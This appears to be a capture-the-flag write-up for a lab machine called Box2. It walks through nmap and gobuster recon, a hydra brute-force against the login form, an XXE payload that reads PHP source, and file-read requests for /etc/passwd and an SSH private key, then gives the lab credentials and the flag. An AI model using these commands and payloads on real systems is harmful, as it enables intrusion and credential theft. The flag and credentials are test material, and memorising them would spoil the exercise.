# Box2

## Recon

### Nmap

With an NMAP classical scan we identify 4 open ports

Port | Service
---- | ----
22   | SSH OpenSSH 6.7p1 
80   | Apache 2.4.10
10022| SSH OpenSSH 6.7p1 
11022| SSH OpenSSH 6.7p1 

## Web

### Enumeration


A quick scan with gobuster gives the following output
```bash
/.php                 (Status: 403) [Size: 292]
/index.php            (Status: 200) [Size: 6011]
/assets               (Status: 301) [Size: 315] [--> http://192.168.56.21/assets/]
/profile.php          (Status: 302) [Size: 1639] [--> index.php]
/includes             (Status: 301) [Size: 317] [--> http://192.168.56.21/includes/]
/login.php            (Status: 200) [Size: 1301]
/databases.php        (Status: 200) [Size: 2393]
/css                  (Status: 301) [Size: 312] [--> http://192.168.56.21/css/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.56.21/js/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/employees.php        (Status: 200) [Size: 5005]
```

**login.php**
We try an SQLInjection on both parameters without success

**employees.php**

We notice the iterator `employee_id`
```/employees.php?employee_id=42```

With the help of the burpsuite intruder we find a new page at `employee_id=42`

Carlos Sysadmin
`carlos@wingcorp.com`

### Bruteforce

**Carlos**

```bash
hydra -l carlos@wingcorp.com -P /usr/share/wordlists/rockyou.txt 192.168.56.21 http-post-form "/login.php:email=^USER^&password=^PASS^:F=Invalid Credentials."
```

We have a tag !

`carlos@wingcorp.com:sunshine1`

### XXE

With carlos profile we can now access the profile page. 

```xml
Cookie: PHPSESSID=n0ncs36q1rnt4fqb0ddd4p0037

<!DOCTYPE replace [<!ENTITY xxe SYSTEM
"php://filter/convert.base64-encode/resource=databases.php"> ]>
<profile><username>&xxe;</username><email>carlos@wingcorp.com</email><password>sunshine1</password></profile>
```

We can XXE to access any file in lecture where www-data have rights.

**/includes/config.php**

`/includes/config.php` gives us the database credentials

`admin:40xRpMT81Q2+oh9myhMP7w`

**/includes/leaks/php**
This files shows us that there is a webserver running on the hostname `backend` and that `?db={file}` could give us file reading on it

Trying `?db=/etc/passwd` reveals that carlos is an user of the machine.

Trying next `?db=/home/carlos/.ssh/id_rsa` gives us carlos ssh private key !

We should have an ssh access to potentially one of the three ssh ports availables

### SSH on port 11022

We have it !

flag.txt
```
0b4b6e37687ae744d506c9dc0fb32c8
```